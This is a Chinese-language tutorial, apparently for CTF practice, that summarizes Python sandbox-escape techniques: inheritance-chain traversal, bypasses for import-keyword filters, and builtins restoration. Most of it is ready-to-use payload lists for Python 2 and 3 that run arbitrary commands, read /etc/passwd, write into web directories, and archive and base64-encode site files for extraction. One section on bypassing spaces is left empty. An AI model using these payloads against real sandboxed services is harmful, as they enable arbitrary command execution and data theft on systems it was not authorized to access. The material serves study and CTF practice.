# python沙箱逃逸总结
沙箱逃逸,就是在给我们的一个代码执行环境下,脱离种种过滤和限制,最终成功拿到shell权限的过程。其实就是闯过重重黑名单，最终拿到系统命令执行权限的过程。以下是一些绕过python沙箱保护并执行任意命令的技巧，换衣批评指正。

## 内建模块、函数
当我们启动一个python解释器时，即使没有创建任何变量或者函数，还是会有很多函数可以使用，我们称之为内建函数，与之所属的模块叫做内建模块。在python中，初始builtins模块提供内建名称空间到内建对象的映射。dir()函数用于向我们展示一个对象的属性有哪些，在没有提供对象的时候，将会提供当前环境所导入的所有模块，我们可以看到初始模块有哪些：
```sh
>>> dir()
['__annotations__', '__builtins__', '__doc__', '__loader__', '__name__', '__package__', '__spec__']
// 在 2.x 版本中，内建模块被命名为 __builtin__，到了 3.x 就成了 __builtins__
>>>
```
可以看到__builtins__是做为默认初始模块出现的，那么用dir()命令看看__builtins__成员：
```sh
>>> dir(__builtins__)
['ArithmeticError', 'AssertionError', 'AttributeError', 'BaseException', 'BlockingIOError', 'BrokenPipeError', 'BufferError', 'BytesWarning', 'ChildProcessError', 'ConnectionAbortedError', 'ConnectionError', 'ConnectionRefusedError', 'ConnectionResetError', 'DeprecationWarning', 'EOFError', 'Ellipsis', 'EnvironmentError', 'Exception', 'False', 'FileExistsError', 'FileNotFoundError', 'FloatingPointError', 'FutureWarning', 'GeneratorExit', 'IOError', 'ImportError', 'ImportWarning', 'IndentationError', 'IndexError', 'InterruptedError', 'IsADirectoryError', 'KeyError', 'KeyboardInterrupt', 'LookupError', 'MemoryError', 'ModuleNotFoundError', 'NameError', 'None', 'NotADirectoryError', 'NotImplemented', 'NotImplementedError', 'OSError', 'OverflowError', 'PendingDeprecationWarning', 'PermissionError', 'ProcessLookupError', 'RecursionError', 'ReferenceError', 'ResourceWarning', 'RuntimeError', 'RuntimeWarning', 'StopAsyncIteration', 'StopIteration', 'SyntaxError', 'SyntaxWarning', 'SystemError', 'SystemExit', 'TabError', 'TimeoutError', 'True', 'TypeError', 'UnboundLocalError', 'UnicodeDecodeError', 'UnicodeEncodeError', 'UnicodeError', 'UnicodeTranslateError', 'UnicodeWarning', 'UserWarning', 'ValueError', 'Warning', 'WindowsError', 'ZeroDivisionError', '_', '__build_class__', '__debug__', '__doc__', '__import__', '__loader__', '__name__', '__package__', '__spec__', 'abs', 'all', 'any', 'ascii', 'bin', 'bool', 'breakpoint', 'bytearray', 'bytes', 'callable', 'chr', 'classmethod', 'compile', 'complex', 'copyright', 'credits', 'delattr', 'dict', 'dir', 'divmod', 'enumerate', 'eval', 'exec', 'exit', 'filter', 'float', 'format', 'frozenset', 'getattr', 'globals', 'hasattr', 'hash', 'help', 'hex', 'id', 'input', 'int', 'isinstance', 'issubclass', 'iter', 'len', 'license', 'list', 'locals', 'map', 'max', 'memoryview', 'min', 'next', 'object', 'oct', 'open', 'ord', 'pow', 'print', 'property', 'quit', 'range', 'repr', 'reversed', 'round', 'set', 'setattr', 'slice', 'sorted', 'staticmethod', 'str', 'sum', 'super', 'tuple', 'type', 'vars', 'zip']
>>>
```
看到很多熟悉的关键字。比如：```__import__```、str、len等。至此python解释器里能够直接使用某些函数，比如直接使用len()函数。

## 继承关系
python中对一个变量应用```__class__```方法能从一个变量实例转到对应的对象类型，python的继承机制,与java等语言不同,python允许多重继承。再得到对象类型后可进一步利用以下方法获取更多的继续类型。

```__base__``` //对象的一个基类，一般情况下是object，有时不是，这时需要使用下一个方法

```__mro__ ```//同样可以获取对象的基类，只是这时会显示出整个继承链的关系，是一个基类列表，object在最底层故在列表中的最后，通过__mro__[-1]可以获取到

```__subclasses__()``` //继承此对象的子类，返回一个列表

有这些类继承的方法，我们就可以从任何一个变量，回溯到基类中去，再获得到此基类所有实现的类，就可以获得到很多的类，进而调用更多的方法达到目的。

## 魔术函数
魔法方法是python内置方法，不需要主动调用，存在的目的是为了给python的解释器进行调用，几乎每个魔法方法都有一个对应的内置函数，或者运算符，当我们对这个对象使用这些函数或者运算符时就会调用类中的对应魔法方法，可以理解为重写内置函数。
```__dict__```: 类的静态函数、类函数、普通函数、全局变量以及一些内置的属性都是放在类的__dict__里的。对象的__dict__中存储了一些self.xxx的一些东西，内置的数据类型没有__dict__属性，每个类有自己的__dict__属性。

```__globals__```: 该属性是函数特有的属性，记录当前文件全局变量的值，如果某个文件调用了os、sys等库，但我们只能访问该文件某个函数或者某个对象，那么我们就可以利用globals属性访问全局的变量。该属性保存的是函数全局变量的字典引用。

```__getattribute__```: 实例、类、函数都具有的__getattribute__魔术方法。事实上，在实例化的对象进行操作的时候（形如：a.xxx/a.xxx()），都会自动去调用__getattribute__方法。因此我们同样可以直接通过这个方法来获取到实例、类、函数的属性。

## 支持命令执行的python库
```python
os.system("ls")
os.popen("ls").read()
commands.getstatusoutput("ls") 
commands.getoutput("ls")
commands.getstatus("file/path")
subprocess.call("ls", shell=True)
subprocess.Popen("ls", shell=True)
pty.spawn("ls")
pty.spawn("/bin/bash")
platform.os.system("ls")

#Import functions to execute commands
importlib.import_module("os").system("ls")
importlib.__import__("os").system("ls")
imp.load_source("os","/usr/lib/python3.8/os.py").system("ls")
imp.os.system("ls")
imp.sys.modules["os"].system("ls")
sys.modules["os"].system("ls")
__import__("os").system("ls")
import os
from os import *

#Other interesting functions
open("/etc/passwd").read()
open('/var/www/html/input', 'w').write('123')

#In Python2.7
execfile('/usr/lib/python2.7/os.py')
system('ls')
```
其中，open和read函数对于读取python沙盒中的文件以及编写一些可以绕过沙盒执行的代码非常有用。

## 沙盒逃匿思想
核心就是那几个魔术方法像是__mro__,```__base__```,这两个意思都是寻找父类，然后找到<type 'object'>(python2)或是<class 'object'>(python3)，然后寻找其子类，再去找命令执行或是文件读取的模块。
## **import相关**
对于防御者来说，最基础的思路，就是对代码的内容进行检查，最常见的方法呢，就是禁止引入敏感的包
```python
import re
code = open('code.py').read()
pattern  = re.compile('import\s+(os|commands|subprocess|sys)')
match = re.search(pattern,code)
if match:
    print "forbidden module import detected"
    raise Exception
```
用以上的几行代码，就可以简单的完成对于敏感的包的检测，我们知道要执行shell命令必须引入 os/commands/subprocess这几个包，对于攻击者来说该如何绕过呢，必须使用其他的引入方式
 * 1. import 关键字
 * 2. __import__函数
 * 3. importlib库

import 是一个关键字，因此，包的名字是直接以'tag'(标记)的方式引入的，但是对于函数和包来说，引入包的名字就是他们的参数，也就是说，将会以字符串的方式引入，我们可以对原始关键字做出种种处理来bypass掉源码扫描。
以__import__函数举例：
```python
f3ck = __import__("pbzznaqf".decode('rot_13'))
print f3ck.getoutput('ifconfig')
```
```python
#或者使用importlib 这一个库
import importlib
f3ck = importlib.import_module("pbzznaqf".decode('rot_13')
print f3ck.getoutput('ifconfig')
```
使用execfile：
```python
#pytho2
execfile('/usr/lib/python2.7/os.py')
system('ls')
#python3
with open('/usr/lib/python3.6/os.py','r') as f:
    exec(f.read())
system('ls')
```
```python
import sys
sys.modules['os']='/usr/lib/python2.7/os.py'
import os
```
## **```__builtins__```**
刚才的__import__函数同样也是一个builtin函数，常用的危险函数eval,exec,execfile也是__builtin__的
但是，有的时候你通过上述两种方式无法找到该模块，dir也不行。上述方法能够生效的前提是，在最开始有这样的程序语句import __builtin__，这个import的意义并不是把内建模块加载到内存中，因为内建早已经被加载了，它仅仅是让内建模块名在该作用域中可见。
如果把这些函数从__builtin__中删除,那么就不能够再直接使用了，解决办法：
```python
reload(__builtin__) #就可以重新得到完整的__builtin__模块了
# 但是reload也是__builtin__下面的函数，如果直接把它干掉，就没办法重新引入了，这个时候,我们该怎么呢
# 在python中,有一个模块叫做imp，然后我们就会重新得到完整的__builtin__模块了
import imp
imp.reload(__builtin__)
````
## **sys.modules**
sys.modules 是一个字典，里面储存了加载过的模块信息。如果 Python 是刚启动的话，所列出的模块就是解释器在启动时自动加载的模块。有些库例如 os 是默认被加载进来的，但是不能直接使用，原因在于 sys.modules 中未经 import 加载的模块对当前空间是不可见的。

如果将 os 从 sys.modules 中剔除，os 就彻底没法用了：
```python
>>> sys.modules['os'] = 'not allowed'
>>> import os
>>> os.system('ls')
Traceback (most recent call last):
  File "<stdin>", line 1, in <module>
AttributeError: 'str' object has no attribute 'system'
>>>
```
解决办法是删了sys.modules['os']，会让Python重新加载一次os
```python
del sys.modules['os']
import os
os.system('ls')
# 或者
execfile('/usr/lib/python2.7/os.py')
system('ls')
```
## **Python2 POC**
```python
#命令执行payload
[].__class__.__base__.__subclasses__()[69].__init__.__globals__['os'].system('calc')
"".__class__.__mro__[-1].__subclasses__()[60].__init__.__globals__['__builtins__']['eval']('__import__("os").system("ls")')
"".__class__.__mro__[-1].__subclasses__()[61].__init__.__globals__['__builtins__']['eval']('__import__("os").system("ls")')
"".__class__.__mro__[-1].__subclasses__()[29].__call__(eval,'__import__("os").system("calc")')
''.__class__.__mro__[2].__subclasses__()[59].__init__.func_globals['linecache'].os.popen('calc').read()
().__class__.__bases__[0].__subclasses__()[59].__init__.__getattribute__('func_global'+'s')['linecache'].__dict__['o'+'s'].__dict__['sy'+'stem']('calc')
().__class__.__bases__[0].__subclasses__()[60]()._module.__builtins__['__import__']('os').system('calc')
().__class__.__bases__[0].__subclasses__()[59].__init__.func_globals.values()[13]["eval"]("__import__('os').system('calc')")
# Or you could obtain the builtins from a defined function
get_flag.__globals__['__builtins__']['__import__']("os").system("ls")
```
```python
#读取文件
"".__class__.__mro__[-1].__subclasses__()[40]("D:/flag").read()
```
## **Python3 POC**
```python
# read 函数，读文件
''.__class__.__mro__[-1].__subclasses__()[59].__init__.__globals__['__builtins__']['open']('/etc/passwd').read()
().__class__.__bases__[0].__subclasses__()[40]('abc.php').read()
().__class__.__bases__[0].__subclasses__()[59].__init__.__globals__['__builtins__']['eval']("open('/etc/passwd').read()")
# write 函数，写文件
().__class__.__bases__[0].__subclasses__()[40]('/var/www/html/input', 'w').write('123')
# 执行任意命令
().__class__.__bases__[0].__subclasses__()[59].__init__.func_globals.values()[13]['eval']('__import__("os").popen("ls /var/www/html").read()' )
# 通过 system 执行任意命令
[].__class__.__base__.__subclasses__()[59].__init__.__globals__['linecache'].__dict__['os'].system('id')
''.__class__.__base__.__subclasses__()[80].__init__.__globals__["sys"].modules["os"].system("whoami")
# 通过 popen 执行任意命令
().__class__.__bases__[0].__subclasses__()[59].__init__.__getattribute__('func_globals')['linecache'].__dict__['os'].__dict__['popen']('id').read()
().__class__.__bases__[0].__subclasses__()[59].__init__.__globals__['__builtins__']['__import__']('os').system('ls')
().__class__.__bases__[0].__subclasses__()[59].__init__.__globals__['__builtins__']['__import__']('os').popen('cat /etc/passwd').read()
().__class__.__bases__[0].__subclasses__()[59].__init__.['__builtins__']['__import__']('subprocess').Popen(['cat', '/etc/passwd']).read()
# 打包文件
().__class__.__bases__[0].__subclasses__()[59].__init__.__getattribute__('func_globals')['linecache'].__dict__['os'].__dict__['popen']('tar -czvf /tmp/www.tar.gz /home/ctf/www').read()
# base64 编码读取文件
().__class__.__bases__[0].__subclasses__()[59].__init__.__getattribute__('func_globals')['linecache'].__dict__['os'].__dict__['popen']('base64 /tmp/www.tar.gz').read()
```
## **花式绕过总结**
### 绕过空格

###

## 参考资料
【Escaping the Python Sandbox】https://zolmeister.com/2013/05/escaping-python-sandbox.html<br>
【Sandbox Escape with Python】https://prog.world/sandbox-escape-with-python/<br>
【】http://www.secwk.com/2019/10/17/11283/<br>
【】https://www.cnblogs.com/tr1ple/p/9415641.html<br>
【】https://www.freebuf.com/articles/system/203208.html<br>
【】https://0day.work/jinja2-template-injection-filter-bypasses/<br>
【】https://book.hacktricks.xyz/misc/basic-python/bypass-python-sandboxes<br>